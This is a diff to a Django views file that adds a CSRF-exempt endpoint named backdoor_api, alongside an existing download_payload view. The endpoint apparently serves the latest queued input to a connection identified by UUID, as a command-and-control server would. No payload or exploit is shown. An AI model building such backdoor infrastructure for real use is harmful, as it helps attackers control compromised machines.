@@ -6,10 +6,7 @@ from rest_framework import status
 from rest_framework.decorators import api_view
 from rest_framework.response import Response
 from django.views.decorators.csrf import csrf_exempt
-
-
-def index(request):
-    return HttpResponse("Hello, world. You're at the polls index.")
+from connections.models import Connection, TempData
 
 
 def download_payload(request):
@@ -33,3 +30,18 @@ def any_rest_api(request):
         print(f'POST IS: {request.POST}')
         return Response(request.POST)
 
+
+@csrf_exempt
+@api_view(['GET', 'POST'])
+def backdoor_api(request, uuid):
+    if request.method == 'GET':
+        x = Connection.objects.get(uuid=uuid)
+        this = {'this': x.uuid}
+        output_list = [i.input for i in TempData.objects.all()]
+        this['value'] = output_list[-1]
+        return Response(this)
+
+    elif request.method == 'POST':
+        print(f'POST IS: {request.POST}')
+        print(request.user)
+        return Response(request.POST)
